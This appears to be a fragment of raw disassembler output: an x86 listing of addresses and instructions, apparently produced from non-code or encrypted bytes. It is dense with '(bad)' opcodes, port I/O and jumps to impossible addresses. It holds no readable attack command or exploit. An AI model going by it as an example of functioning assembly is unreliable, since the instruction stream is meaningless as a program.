  41359b:	(bad)  
  41359c:	out    dx,eax
  41359d:	mov    esi,0xbef4efcd
  4135a2:	loope  0x4135a0
  4135a4:	int    0xec
  4135a6:	pop    es
  4135a7:	stc    
  4135a8:	out    0xc5,eax
  4135aa:	jmp    0x4135ac
  4135ac:	(bad)
  4135af:	(bad)  
  4135b0:	or     eax,0xdfceb1d2
  4135b5:	fmul   st(1),st
  4135b7:	(bad)  
  4135b8:	mov    bl,0xb1
  4135ba:	sti    
  4135bb:	retf   0xe8f5
  4135be:	retf   
  4135bf:	fidivr WORD PTR [ecx+ecx*8-0x2f81cfe]
  4135c6:	fsubr  st(2),st
  4135c8:	(bad)  
  4135c9:	fcmovu st,st(4)
  4135cb:	cli    
  4135cc:	add    esp,ebx
  4135ce:	loop   0x4135b3
  4135d0:	into   
  4135d1:	out    0xd1,al
  4135d3:	stos   BYTE PTR es:[edi],al
  4135d4:	in     eax,dx
  4135d5:	shr    ecx,cl
  4135d7:	jmp    0xf5fc1fa5
  4135dc:	in     eax,dx
  4135dd:	cmc    
  4135de:	(bad)  
  4135e0:	mov    edx,0xf4c8c9ee
  4135e5:	fld    DWORD PTR [ebx]
  4135e7:	stc    
  4135e8:	faddp  st(7),st
  4135ea:	xlat   BYTE PTR ds:[ebx]
  4135eb:	(bad)  
  4135ed:	loop   0x4135b9
  4135ef:	fisttp QWORD PTR [ecx]
  4135f1:	call   eax
  4135f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135f4:	call   0xf2fe2ce4
  4135f9:	mov    edx,0xffcbbab4
  4135fe:	jmp    0xf0180df5
  413603:	std    
  413604:	(bad)  
  413605:	jecxz  0x4135e3
  413607:	loopne 0x413605
  413609:	add    eax,0xe4df01c4
  41360e:	retf   
  41360f:	out    0xc4,eax
  413611:	repnz fmulp st(7),st
  413614:	imul   ah
  413616:	stos   DWORD PTR es:[edi],eax
  413617:	leave  
  413618:	out    0xbb,al
  41361a:	scas   eax,DWORD PTR es:[edi]
  41361b:	fcom   st(1)
  41361d:	ror    bh,1
  41361f:	fdivr  st,st(5)
  413621:	fcmovnu st,st(3)
  413623:	ret    
  413624:	stc    
  413625:	out    dx,al
  413626:	ret    
  413627:	hlt    
  413628:	in     eax,0x5
  41362a:	aad    0xc1
  41362c:	add    al,0x4
  41362e:	cli    
  41362f:	or     edx,ebx
  413631:	add    ebp,ecx
  413633:	ret    
  413634:	lods   al,BYTE PTR ds:[esi]
  413635:	repz call 0xb42e31fd
  41363b:	xlat   BYTE PTR ds:[ebx]
  41363c:	retf   0xf6b5
  41363f:	(bad)  
  413641:	aam    0xc1
  413643:	mov    edx,0xf9c2eedd
  413648:	loope  0x41361e
  41364a:	add    al,BYTE PTR ds:0xaeadecb
  413650:	les    eax,FWORD PTR [edx]
  413652:	mov    cl,0xb0
  413654:	lds    edi,FWORD PTR [esi-0x33280d23]
  41365a:	cmc    
  41365b:	ror    edx,1
  41365d:	rcr    esi,cl
  41365f:	aad    0xde
  413661:	(bad)  
  413663:	iret   
  413664:	(bad)  
  413666:	add    al,BYTE PTR [ebx]
  413668:	in     al,0x3
  41366a:	ret    
  41366b:	add    eax,0xe409e2de
  413670:	retf   0xad05
  413673:	jmp    0x41363d
  413675:	shl    ah,1
  413677:	ret    0xfbb5
  41367a:	mov    al,0xb7
  41367c:	lods   eax,DWORD PTR ds:[esi]
  41367d:	(bad)  
  41367f:	fcomip st,st(5)
  413681:	sar    esp,1
  413683:	fmul   st,st(6)
  413685:	loop   0x413673
  413687:	hlt    
  413688:	les    eax,FWORD PTR [edi]
  41368a:	clc    
  41368b:	neg    esp
  41368d:	aam    0xca
  41368f:	in     eax,dx
  413690:	retf   
  413691:	loopne 0x413660
  413693:	rol    dh,0xbe
  413696:	div    dl
  413698:	int3   
  413699:	in     eax,dx
  41369a:	leave  
  41369b:	in     al,0xc4
  41369d:	stc    
  41369e:	fnstcw WORD PTR [esi+edi*8-0x21420737]
  4136a5:	idiv   esi
  4136a7:	add    eax,0x9d7c0d9
  4136ac:	cld    
  4136ad:	or     al,bh
  4136af:	out    dx,al
  4136b0:	pop    es
  4136b1:	icebp  
  4136b2:	mov    cl,0xbe
  4136b4:	out    0xc5,eax
  4136b6:	ror    cl,1
  4136b8:	jmp    0xdcf9:0xcce4f7c1
  4136bf:	sar    BYTE PTR [ebp-0x3f41280e],cl
  4136c5:	loope  0x4136a4
  4136c7:	(bad)  
  4136c8:	aam    0xe2
  4136ca:	std    
  4136cb:	add    cl,BYTE PTR [esi]
  4136cd:	faddp  st(5),st
  4136cf:	or     cl,BYTE PTR ds:0xeecabd04
  4136d5:	ror    ebx,0xf3
  4136d8:	cmc    
  4136d9:	in     al,0xe4
  4136db:	shl    bh,cl
  4136dd:	into   
  4136de:	retf   0xbfff
  4136e1:	jmp    0xc7e7:0xc7eefbcc
  4136e8:	(bad)  
  4136ea:	mov    edi,0xf8ca09dc
  4136ef:	out    dx,eax
  4136f0:	iret   
  4136f1:	out    dx,al
  4136f2:	iret   
  4136f3:	loope  0x4136c0
  4136f5:	(bad)  
  4136f6:	call   0xfaf611e0
  4136fb:	out    0xcd,al
  4136fd:	repz call 0xf238ebff
  413703:	iret   
  413704:	lock mov esi,0xffdbc1bf
  41370a:	or     dh,bl
  41370c:	sti    
  41370d:	out    dx,eax
  41370e:	std    
  41370f:	fcmovu st,st(5)
  413711:	fst    st(1)
  413713:	lods   al,BYTE PTR ds:[esi]
  413714:	(bad)
  413717:	lock ret 0xf9b6
  41371b:	mov    ah,0xb6
  41371d:	mov    edi,0xb0f4cfe4
  413722:	(bad)  
  413724:	push   es
  413725:	loope  0x4136ec
  413727:	(bad)  
  413729:	(bad)  
  41372a:	std    
  41372b:	aam    0xc5
  41372d:	fucom  st(7)
  41372f:	pminub mm5,mm0
  413732:	ret    0xc4d2
  413735:	in     al,0xe8
  413737:	cmc    
  413738:	rcl    esi,cl
  41373a:	clc    
  41373b:	(bad)  
  41373c:	xlat   BYTE PTR ds:[ebx]
  41373d:	mov    ecx,0xb4f5fcc8
  413742:	rcr    eax,1
  413744:	ret    0xe6bf
  413747:	out    0xf6,eax
  413749:	cld    
  41374a:	ror    ebx,1
  41374c:	add    edi,edi
  41374e:	(bad)  
  41374f:	stc    
  413750:	loopne 0x41373a
  413752:	repz in eax,0xe0
  413755:	out    0xd4,al
  413757:	mov    al,0xc4
  413759:	ror    edx,1
  41375b:	shl    DWORD PTR [ecx+ebp*8-0x94b352a],cl
  413762:	lock cmc 
  413764:	jecxz  0x413741
  413766:	loope  0x41375b
  413768:	clc    
  413769:	fiadd  DWORD PTR [ecx+eiz*8]
  41376c:	loop   0x41374c
  41376e:	(bad)  
  41376f:	clc    
  413770:	fcmovnu st,st(7)
  413772:	jecxz  0x41373f
  413774:	in     eax,dx
  413775:	test   edx,0xedd5e4ae
  41377b:	fxch   st(1)
  41377d:	int3   
  41377e:	int    0xfd
  413780:	mov    edx,0xe7bdffd2
  413785:	lock sti 
  413787:	mul    ecx
  413789:	retf   0x40b
  41378c:	(bad)  
  41378e:	out    dx,eax
  41378f:	hlt    
  413790:	cli    
  413791:	fistp  QWORD PTR [edi-0x2e16341d]
  413797:	repnz mov cl,0xe6
  41379a:	ror    edx,cl
  41379c:	mov    ah,0xc9
  41379e:	in     eax,dx
  41379f:	mov    edx,0xccceb8cb
  4137a4:	(bad)  
  4137a5:	sar    ah,0xff
  4137a8:	hlt    
  4137a9:	mul    ecx
  4137ab:	jecxz  0x413772
  4137ad:	(bad)  
  4137af:	std    
  4137b0:	in     eax,0xc8
  4137b2:	fyl2x  
  4137b4:	lds    ebp,FWORD PTR [edi-0x4e4e0d3e]
  4137ba:	stc    
  4137bb:	mov    ecx,0xe9f6d8d7
  4137c0:	std    
  4137c1:	aad    0xc3
  4137c3:	clc    
  4137c4:	add    dh,ch
  4137c6:	add    eax,0xc1e7dfda
  4137cb:	div    esp
  4137cd:	or     bh,ch
  4137cf:	(bad)
  4137d3:	int3   
  4137d4:	mov    esp,0xebe6bcce
  4137d9:	in     eax,0xd7
  4137db:	mov    edx,0xeddab5c6
  4137e0:	fnstenv [eax-0x1e0d49ff]
  4137e6:	loopne 0x4137c2
  4137e8:	mov    ecx,0xdde8e6f2
  4137ed:	fucom  st(4)
  4137ef:	iret   
  4137f0:	jmp    0xbde9:0xd0e0cc02
  4137f7:	shl    edx,cl
  4137f9:	rcr    cl,cl
  4137fb:	(bad)  
  4137fc:	cmc    
  4137fd:	jmp    0xea0113cb
  413802:	ret    
  413803:	call   0xd71b3d0f
  413808:	mov    ebp,0xe1da09d6
  41380d:	jecxz  0x4137f9
  41380f:	adc    ecx,ebx
  413811:	add    eax,0xadecf2c5
  413816:	lods   eax,DWORD PTR ds:[esi]
  413817:	icebp  
  413818:	fcomi  st,st(5)
  41381a:	fcomi  st,st(3)
  41381c:	sar    al,1
  41381e:	jmp    0xe2321c0c
  413823:	cld    
  413824:	add    DWORD PTR [eax],eax
  413826:	in     eax,dx
  413827:	repnz rol DWORD PTR [esi],1
  41382a:	(bad)
  41382d:	add    DWORD PTR [esi],eax
  41382f:	cli    
  413830:	add    BYTE PTR [edx],cl
  413832:	int3   
  413833:	iret   
  413834:	scas   eax,DWORD PTR es:[edi]
  413835:	shl    DWORD PTR [ebx-0x342d4825],0xc9
  41383c:	int3   
  41383d:	fstp   TBYTE PTR [ecx-0x3c372b2f]
  413843:	fsubrp st(1),st
  413845:	(bad)  
  413846:	aad    0xf1
  413848:	fisttp WORD PTR [edx]
  41384a:	shr    ecx,0xeb
  41384d:	aam    0xc6
  41384f:	hlt    
  413850:	dec    DWORD PTR [ebx]
  413852:	mov    eax,0xc6d0b1c4
  413857:	fcmovnbe st,st(5)
  413859:	enter  0xfbf7,0xd4
  41385d:	int    0xd3
  41385f:	xlat   BYTE PTR ds:[ebx]
  413860:	add    al,bl
  413862:	mov    eax,0xd9fcf8f6
  413867:	hlt    
  413868:	idiv   cl
  41386a:	jmp    0x413834
  41386c:	add    BYTE PTR ds:0x12f20cc8,al
  413872:	mov    ebp,0xcfcfa5c7
  413877:	in     eax,dx
  413878:	enter  0xb7bb,0xdb
  41387c:	out    0xb0,al
  41387e:	mov    bh,0xf8
  413880:	add    ebp,ebp
  413882:	cli    
  413883:	mov    edi,0xc1e6d9e6
  413888:	rol    edx,cl
  41388a:	sar    eax,0x1
  41388d:	or     eax,0xadac5d5
  413892:	mov    edi,0xf4e9f6a6
  413897:	stos   BYTE PTR es:[edi],al
  413898:	jmp    0xc6fa0e98
  41389d:	(bad)  
  41389f:	sti    
  4138a0:	shl    edx,cl
  4138a2:	repnz (bad) 
  4138a5:	sti    
  4138a6:	push   es
  4138a7:	push   es
  4138a8:	push   es
  4138a9:	(bad)  
  4138aa:	stc    
  4138ab:	sti    
  4138ac:	(bad)  
  4138ae:	pop    es
  4138af:	adc    ebp,edi
  4138b1:	jmp    0xd42bf768
  4138b6:	ret    0xd5d7
  4138b9:	icebp  
  4138ba:	out    dx,eax
  4138bb:	sti    
  4138bc:	aad    0xdf
  4138be:	mov    ebx,0xded9fcbf
  4138c3:	out    0xd4,eax
  4138c5:	loop   0x4138ca
  4138c7:	jmp    0x413889
  4138c9:	inc    DWORD PTR [edi]
  4138cb:	fimul  DWORD PTR [ebx]
  4138cd:	add    esp,edi
  4138cf:	enter  0xc913,0xbc
  4138d3:	lods   eax,DWORD PTR ds:[esi]
  4138d4:	retf   0xd2e7
  4138d7:	cmc    
  4138d8:	sti    
  4138d9:	int    0xb0
  4138db:	sar    cl,cl
  4138dd:	retf   0xccb3
  4138e0:	int    0x2
  4138e2:	hlt    
  4138e3:	add    al,dh
  4138e5:	ret    0xfaf7
  4138e8:	shl    ecx,0x0
  4138eb:	add    esp,ecx
  4138ed:	fmul   st(1),st
  4138ef:	aam    0x5
  4138f1:	push   cs
  4138f2:	lock fsubr DWORD PTR [esi-0x11294c33]
  4138f9:	cli    
  4138fa:	mov    ecx,0xf9f2eff8
  4138ff:	xlat   BYTE PTR ds:[ebx]
  413900:	std    
  413901:	mov    ebp,0x6b9fef4
  413906:	add    DWORD PTR [ebp+edi*4-0x1b17f53d],edi
  41390d:	(bad)  
  41390e:	loopne 0x413919
  413910:	fld1   
  413912:	stos   BYTE PTR es:[edi],al
  413913:	ret    
  413914:	icebp  
  413915:	mov    bl,0xd5
  413917:	mov    ch,0xe1
  413919:	shr    ch,cl
  41391b:	stc    
  41391c:	enter  0xe8bb,0xdf
  413920:	mov    cl,0xea
  413922:	into   
  413923:	add    ch,bh
  413925:	int    0xc7
  413927:	add    eax,0xf0cbd906
  41392c:	dec    DWORD PTR [edi]
  41392e:	int    0xd
  413930:	shl    eax,0xee
  413933:	fmul   st,st(2)
  413935:	ret    
  413936:	mov    bl,0xf2
  413938:	ror    ecx,1
  41393a:	in     al,dx
  41393b:	int3   
  41393c:	mov    al,0xb6
  41393e:	shl    edx,1
  413940:	iret   
  413941:	add    esi,edx
  413943:	(bad)  
  413945:	hlt    
  413946:	jecxz  0x41392d
  413948:	cmc    
  413949:	add    eax,0xf4cbc0fb
  41394e:	push   es
  41394f:	(bad)
  413953:	leave  
  413954:	into   
  413955:	repnz shl cl,cl
  413958:	mov    cl,0xec
  41395a:	in     al,0xb1
  41395c:	jmp    0xfb20f152
  413961:	xlat   BYTE PTR ds:[ebx]
  413962:	clc    
  413963:	repnz pop es
  413965:	hlt    
  413966:	sti    
  413967:	out    0xd5,eax
  413969:	(bad)  
  41396a:	imul   dl
  41396c:	retf   0xc8c7
  41396f:	leave  
  413970:	or     dh,dl
  413972:	in     eax,0xaf
  413974:	test   eax,0xd3aacae4
  413979:	mov    al,0xe5
  41397b:	jmp    0xb9d8:0xb4e9f0cb
  413982:	loope  0x413955
  413984:	int    0x6
  413986:	loope  0x413964
  413988:	repnz sti 
  41398a:	loop   0x413980
  41398c:	in     eax,0xc0
  41398e:	or     al,0xee
  413990:	in     eax,0x2
  413992:	repnz icebp 
  413994:	ret    
  413995:	loope  0x41398b
  413997:	hlt    
  413998:	out    0xcf,eax
  41399a:	shl    esi,cl
  41399c:	jmp    0x41396c
  41399e:	jmp    0x413971
  4139a0:	sar    cl,cl
  4139a2:	std    
  4139a3:	cli    
  4139a4:	mov    esp,0xf8d0f2e7
  4139a9:	jmp    0x41398f
  4139ab:	(bad)  
  4139ac:	in     eax,0xf6
  4139ae:	fmul   st,st(7)
  4139b0:	out    0xc,al
  4139b2:	enter  0xe7bd,0xcd
  4139b6:	int3   
  4139b7:	(bad)  
  4139b8:	aam    0xd1
  4139ba:	retf   0xccd2
  4139bd:	mov    ebx,0xcdb5f2d6
  4139c2:	aad    0xf2
  4139c4:	out    dx,al
  4139c5:	add    dl,bh
  4139c7:	clc    
  4139c8:	add    eax,edx
  4139ca:	push   es
  4139cb:	fadd   QWORD PTR [eax]
  4139cd:	loop   0x413996
  4139cf:	int3   
  4139d0:	or     edx,ebp
  4139d2:	shr    esi,cl
  4139d4:	retf   0xedd2
  4139d7:	out    dx,al
  4139d8:	lods   al,BYTE PTR ds:[esi]
  4139d9:	(bad)  
  4139da:	(bad)  
  4139dd:	cmc    
  4139de:	mov    ecx,0xe8cfbdb6
  4139e3:	add    ecx,edx
  4139e5:	push   es
  4139e6:	mov    esi,0xe1fad8bc
  4139eb:	retf   
  4139ec:	add    eax,0xf807f9e8
  4139f1:	adc    ebp,esp
  4139f3:	mov    bl,0xb0
  4139f5:	jmp    0xbad3:0xc4b0efef
  4139fc:	jmp    0x4139d3
  4139fe:	dec    edx
  413a00:	fxch   st(5)
  413a02:	out    dx,eax
  413a03:	mov    dh,0xce
  413a05:	push   es
  413a06:	aam    0xba
  413a08:	cmc    
  413a09:	fadd   DWORD PTR ds:0xd8de01e3
  413a0f:	call   0xdf2720e0
  413a14:	shl    DWORD PTR [esi+ebp*4-0x29064b3e],cl
  413a1b:	hlt    
  413a1c:	hlt    
  413a1d:	call   0xcb302d06
  413a22:	cld    
  413a23:	enter  0xf4f6,0xda
  413a27:	rol    BYTE PTR ds:0xc6f4d8ca,0xe0
  413a2e:	fdivr  st(3),st
  413a30:	push   cs
  413a31:	shr    BYTE PTR [edx-0x1e3f363c],cl
  413a37:	repnz lods al,BYTE PTR ds:[esi]
  413a39:	out    dx,al
  413a3a:	mov    ecx,0xbdf4f1ef
  413a3f:	mov    ebx,0xd9f2f0ff
  413a44:	mov    esp,0xdfdfd6be
  413a49:	(bad)  
  413a4b:	ret    0xfdea
  413a4e:	aad    0xc9
  413a50:	add    ebp,ecx
  413a52:	(bad)  
  413a53:	leave  
  413a54:	out    dx,al
  413a55:	call   0xfbee2f4c
  413a5a:	mov    bl,0xc8
  413a5c:	mov    ch,0xf2
  413a5e:	rcl    ch,1
  413a60:	(bad)  
  413a61:	loop   0x413a4c
  413a63:	into   
  413a64:	out    0xc2,al
  413a66:	cmc    
  413a67:	loopne 0x413a63
  413a69:	add    ebp,eax
  413a6b:	retf   
  413a6c:	out    0xdf,eax
  413a6e:	or     bl,dh
  413a70:	shr    esp,cl
  413a72:	mov    bl,0xec
  413a74:	lods   eax,DWORD PTR ds:[esi]
  413a75:	mov    dh,0xd6
  413a77:	fsubr  st(2),st
  413a79:	div    ebp
  413a7b:	int3   
  413a7c:	(bad)  
  413a7d:	ror    ecx,1
  413a7f:	mov    edi,0xfac8f1f4
  413a84:	cld    
  413a85:	xlat   BYTE PTR ds:[ebx]
  413a86:	aad    0xf7
  413a88:	add    DWORD PTR [ecx],ecx
  413a8a:	(bad)  
  413a8b:	loop   0x413a97
  413a8d:	jmp    ebp
  413a8f:	or     eax,0xe7e5e2d8
  413a94:	call   0xf4282a86
  413a99:	fcomi  st,st(3)
  413a9b:	hlt    
  413a9c:	shr    bl,cl
  413a9e:	in     eax,0xb6
  413aa0:	cld    
  413aa1:	lock loopne 0x413a7f
  413aa4:	mov    ebp,0xe2f3e6ee
  413aa9:	jecxz  0x413a82
  413aab:	fprem1 
  413aad:	or     eax,0xcb09e3fb
  413ab2:	mov    edi,0xd7e1c2dd
  413ab7:	(bad)  
  413ab8:	lods   eax,DWORD PTR ds:[esi]
  413ab9:	mov    cl,0xc8
  413abb:	leave  
  413abc:	shr    ecx,1
  413abe:	call   0xbb140c77
  413ac3:	fcmovbe st,st(7)
  413ac5:	mov    edi,0x1f2c5c5
  413aca:	loopne 0x413a91
  413acc:	clc    
  413acd:	aam    0xe3
  413acf:	fcomp  st(6)
  413ad1:	call   0xd1f125b8
  413ad6:	(bad)
  413ad9:	in     al,dx
  413ada:	rcl    dl,1
  413adc:	in     al,0xf5
  413ade:	mov    dh,0xd0
  413ae0:	(bad)  
  413ae1:	sar    esi,cl
  413ae3:	in     eax,dx
  413ae4:	sti    
  413ae5:	int    0x2
  413ae7:	in     al,dx
  413ae8:	(bad)
  413aeb:	(bad)  
  413aed:	out    0x9,al
  413aef:	or     cl,ch
  413af1:	sar    DWORD PTR [edi-0x111d3709],cl
  413af7:	shl    ebp,1
  413af9:	cmc    
  413afa:	out    0xfb,eax
  413afc:	sar    DWORD PTR [edx-0x362f2918],1
  413b02:	sar    DWORD PTR [ecx-0x1e222b1e],cl
  413b08:	fdivrp st(6),st
  413b0a:	push   es
  413b0b:	les    ecx,FWORD PTR [edx]
  413b0d:	into   
  413b0e:	or     DWORD PTR [edx],ecx
  413b10:	lds    ecx,FWORD PTR [edi+eax*8]
  413b13:	leave  
  413b14:	ret    0xe0f5
  413b17:	mov    bh,0xd6
  413b19:	sar    al,1
  413b1b:	aad    0xf6
  413b1d:	mov    esi,0xcdddcaf5
  413b22:	out    dx,eax
  413b23:	mov    ebp,0xd9f9d0f8
  413b28:	xlat   BYTE PTR ds:[ebx]
  413b29:	fld    QWORD PTR [edi]
  413b2b:	add    eax,0xcaeffce7
  413b30:	fsub   st(0),st
  413b32:	fnstenv [ecx-0x1c330918]
  413b38:	repz (bad) 
  413b3a:	shr    dh,1
  413b3c:	int3   
  413b3d:	mov    eax,0xbdd7e3d0
  413b42:	int    0xf8
  413b44:	out    0xd6,eax
  413b46:	out    0xec,al
  413b48:	loop   0x413b4e
  413b4a:	fdivrp st(5),st
  413b4c:	fild   DWORD PTR ds:0xc0fdd9ec
  413b52:	mov    esp,0xc6c2bcf3
  413b57:	aam    0xb2
  413b59:	mov    dh,0xb1
  413b5b:	fcmovne st,st(7)
  413b5d:	(bad)  
  413b5e:	in     eax,dx
  413b5f:	div    DWORD PTR [ebp-0x92f290d]
  413b65:	inc    bl
  413b67:	sti    
  413b68:	fild   DWORD PTR [esi+ebx*8]
  413b6b:	hlt    
  413b6c:	std    
  413b6d:	or     al,ah
  413b6f:	paddusw mm1,mm4
  413b72:	(bad)
  413b75:	jmp    0xb5f5:0xc4eeacaf
  413b7c:	(bad)
  413b7f:	mov    ebp,0xe8f8edea
  413b84:	aam    0xbf
  413b86:	(bad)  
  413b87:	(bad)  
  413b89:	out    0xde,eax
  413b8b:	fucomi st,st(0)
  413b8d:	push   cs
  413b8e:	add    al,0xda
  413b90:	retf   
  413b91:	or     al,ah
  413b93:	repz (bad) 
  413b95:	ror    edx,cl
  413b97:	xlat   BYTE PTR ds:[ebx]
  413b98:	mov    ebx,0xded1b2c2
  413b9d:	out    0xd6,al
  413b9f:	fcomi  st,st(3)
  413ba1:	add    DWORD PTR [edx],eax
  413ba3:	rol    ebx,0xcd
  413ba6:	cli    
  413ba7:	repnz out 0xc1,eax
  413baa:	les    ecx,FWORD PTR [edx]
  413bac:	enter  0xd9d8,0xc4
  413bb0:	add    al,0xfc
  413bb2:	int    0xd3
  413bb4:	in     al,dx
  413bb5:	mov    bl,0xb7
  413bb7:	iret   
  413bb8:	jmp    0xe9c5:0xe6ecf0c4
  413bbf:	mov    edx,0xe8c3bfec
  413bc4:	out    dx,al
  413bc5:	out    0xbb,eax
  413bc7:	fisttp WORD PTR [edx]
  413bc9:	stc    
  413bca:	call   0xdd111daf
  413bcf:	(bad)  
  413bd0:	inc    DWORD PTR [esi]
  413bd2:	in     eax,dx
  413bd3:	mov    eax,0xedafe6cf
  413bd8:	shl    DWORD PTR [eax-0x28401717],1
  413bde:	mov    ecx,0xf1d6f5f1
  413be3:	add    esp,ebx
  413be5:	mov    ebp,0xc3cbf5fa
  413bea:	aam    0xea
  413bec:	(bad)  
  413bed:	loopne 0x413be7
  413bef:	out    dx,eax
  413bf0:	enter  0xad07,0xc2
  413bf4:	(bad)  
  413bf5:	jmp    0x413bb3
  413bf7:	shl    BYTE PTR [ebp-0x281b280f],1
  413bfd:	icebp  
  413bfe:	jmp    0xddf21200
  413c03:	in     eax,dx
  413c04:	lock cli 
  413c06:	(bad)  
  413c08:	les    ecx,FWORD PTR [edx]
  413c0a:	(bad)  
  413c0b:	aam    0xea
  413c0d:	hlt    
  413c0e:	jmp    0xf6a8:0xceeae5e9
  413c15:	loop   0x413be0
  413c17:	shl    ebx,cl
  413c19:	call   0xd53312e3
  413c1e:	xlat   BYTE PTR ds:[ebx]
  413c1f:	fidiv  DWORD PTR [ecx-0x13042813]
  413c25:	int    0xc0
  413c27:	out    0xe7,eax
  413c29:	lock or cl,al
  413c2c:	fcmovnu st,st(0)
  413c2e:	(bad)  
  413c30:	in     eax,dx
  413c31:	loopne 0x413bf2
  413c33:	out    dx,eax
  413c34:	mov    esp,0xadc6c2d1
  413c39:	loop   0x413c2b
  413c3b:	fcmovne st,st(7)
  413c3d:	mov    ebx,0xd7edbfc8
  413c42:	jecxz  0x413bfc
  413c44:	cmc    
  413c45:	out    0xfb,eax
  413c47:	add    DWORD PTR ds:0xa05fbe7,eax
  413c4d:	cmc    
  413c4e:	jmp    0x413c30
  413c50:	cld    
  413c51:	jecxz  0x413c32
  413c53:	mov    bl,0xc2
  413c55:	in     eax,dx
  413c56:	fst    st(3)
  413c58:	(bad)  
  413c59:	mov    al,0xb6
  413c5b:	(bad)  
  413c5c:	enter  0xddf2,0xd1
  413c60:	mov    edx,0xf40300c3
  413c65:	lock icebp 
  413c67:	(bad)  
  413c68:	or     bh,BYTE PTR [eax-0x93e09fc]
  413c6e:	dec    ebp
  413c70:	add    al,0xdc
  413c72:	mov    esi,0xefc8c2c9
  413c77:	rcr    bl,cl
  413c79:	shl    eax,cl
  413c7b:	in     al,dx
  413c7c:	(bad)  
  413c7d:	(bad)  
  413c7f:	mov    eax,0xbce2eced
  413c84:	loop   0x413c82
  413c86:	loope  0x413c4b
  413c88:	add    edx,edx
  413c8a:	retf   
  413c8b:	mov    DWORD PTR [eax+eax*1],0xb06f4de
  413c92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c93:	les    ebp,FWORD PTR [edi-0x53351743]
  413c99:	div    DWORD PTR [ecx-0x323a1b26]
  413c9f:	repnz leave 
  413ca1:	rcl    dl,1
  413ca3:	fdivp  st(2),st
  413ca5:	rol    dh,0xc0
  413ca8:	aam    0x0
  413caa:	(bad)
  413cad:	loop   0x413cae
  413caf:	in     eax,0xcd
  413cb1:	int    0xa7
  413cb3:	loope  0x413cab
  413cb5:	shl    DWORD PTR [ecx-0x4c383231],0xf5
  413cbc:	jmp    FWORD PTR [esi+esi*4-0x8100416]
  413cc3:	mov    esp,0xc300e0fd
  413cc8:	add    al,0x1
  413cca:	in     eax,0xea
  413ccc:	loopne 0x413ccc
  413cce:	push   es
  413ccf:	or     dh,bl
  413cd1:	repnz fld st(4)
  413cd4:	loop   0x413c7e
  413cd6:	fnsave [edi-0x3738163a]
  413cdc:	repz mov eax,0xc3b4e8d4
  413ce2:	call   0xe7170abb
  413ce7:	cld    
  413ce8:	fcomi  st,st(6)
  413cea:	(bad)  
  413ceb:	out    0xcb,eax
  413ced:	loope  0x413cc8
  413cef:	loop   0x413cf9
  413cf1:	add    DWORD PTR [edx-0x522f2c17],esi
  413cf7:	rol    cl,cl
  413cf9:	int    0xf9
  413cfb:	in     al,dx
  413cfc:	iret   
  413cfd:	mov    eax,0xd1f4c9db
  413d02:	cli    
  413d03:	jecxz  0x413cc1
  413d05:	pop    es
  413d06:	add    edi,eax
  413d08:	out    0xf2,eax
  413d0a:	(bad)  
  413d0b:	jmp    0xe84301da
  413d10:	dec    DWORD PTR [ecx]
  413d12:	(bad)  
  413d14:	retf   0xcba4
  413d17:	mov    al,0xca
  413d19:	test   ch,0xe9
  413d1c:	(bad)  
  413d1d:	fldlg2 
  413d1f:	mov    esp,0xf2bdcdf6
  413d24:	sti    
  413d25:	std    
  413d26:	(bad)  
  413d28:	(bad)  
  413d29:	fisttp DWORD PTR [eax]
  413d2b:	out    0xda,al
  413d2d:	or     DWORD PTR [eax],ecx
  413d2f:	push   cs
  413d30:	or     ebp,ebx
  413d32:	jmp    0x413cfd
  413d34:	shr    ebp,0xe7
  413d37:	mov    dl,0xe0
  413d39:	hlt    
  413d3a:	(bad)  
  413d3b:	(bad)
  413d3f:	idiv   DWORD PTR [ecx+esi*8-0x27200026]
  413d46:	lds    eax,FWORD PTR [edx]
  413d48:	(bad)  
  413d49:	in     al,0xca
  413d4b:	or     bl,bh
  413d4d:	std    
  413d4e:	fdivr  st,st(5)
  413d50:	sti    
  413d51:	or     esp,ebp
  413d53:	mov    esp,0xebc6f2e7
  413d58:	in     eax,0xc0
  413d5a:	in     eax,dx
  413d5b:	sar    BYTE PTR [edx-0x92b0f3c],cl
  413d61:	mov    ecx,0xe2f3fef5
  413d66:	hlt    
  413d67:	repnz add eax,0x6cac9f7
  413d6d:	push   es
  413d6e:	or     eax,0xbffd0301
  413d73:	rcr    ch,1
  413d75:	aad    0xc8
  413d77:	mov    esp,0xcbf8e0f0
  413d7c:	vpsubb ymm0,ymm2,ymm4
  413d80:	mov    edi,0xd2e8e0cf
  413d85:	fld    QWORD PTR [ecx]
  413d87:	rol    ch,1
  413d89:	lock out 0xf5,al
  413d8c:	retf   0xe5d6
  413d8f:	leave  
  413d90:	sti    
  413d91:	jecxz  0x413d40
  413d93:	repz jmp 0x413d7e
  413d96:	mov    esp,0xf9e8c7b7
  413d9b:	icebp  
  413d9c:	clc    
  413d9d:	fldl2t 
  413d9f:	aam    0xca
  413da1:	jmp    0xf13f4067
  413da6:	repz fcmovnu st,st(2)
  413da9:	cld    
  413daa:	jmp    0x413dbb
  413dac:	smsw   eax
  413daf:	(bad)  
  413db0:	out    dx,al
  413db1:	cli    
  413db2:	jmp    0xf7ed:0xc3d1c6be
  413db9:	(bad)  
  413dbb:	into   
  413dbc:	mov    cl,0xee
  413dbe:	out    dx,al
  413dbf:	fcmovbe st,st(0)
  413dc1:	mov    edx,0xe3f3ed
  413dc6:	fdivp  st(7),st
  413dc8:	sar    esi,1
  413dca:	add    edi,esi
  413dcc:	fxch   st(3)
  413dce:	aam    0xf9
  413dd0:	loop   0x413da1
  413dd2:	mov    esp,0xf0e0cae4
  413dd7:	out    dx,al
  413dd8:	out    dx,eax
  413dd9:	rol    ch,0xc8
  413ddc:	repnz fstp TBYTE PTR [esi-0x25430f30]
  413de3:	int    0xd6
  413de5:	ret    
  413de6:	mov    esp,0x2d1e0e7
  413deb:	in     eax,0xe
  413ded:	push   cs
  413dee:	loopne 0x413de8
  413df0:	push   cs
  413df1:	into   
  413df2:	ret    0xddd0
  413df5:	mov    esp,0xd4f6e3f3
  413dfa:	mov    edx,0xcec6bae8
  413dff:	mov    edi,0xf8f6fbbe
  413e04:	neg    ch
  413e06:	sar    BYTE PTR [esi+0xafae1d3],1
  413e0c:	shl    bl,0x4
  413e0f:	loop   0x413de4
  413e11:	jmp    0xf6cb:0xb7cbd1eb
  413e18:	xlat   BYTE PTR ds:[ebx]
  413e19:	int    0xfb
  413e1b:	mov    eax,0xc4f9f8b9
  413e20:	mov    esp,0xd9ec02c9
  413e25:	clc    
  413e26:	shl    edi,1
  413e28:	ret    0xe3e5
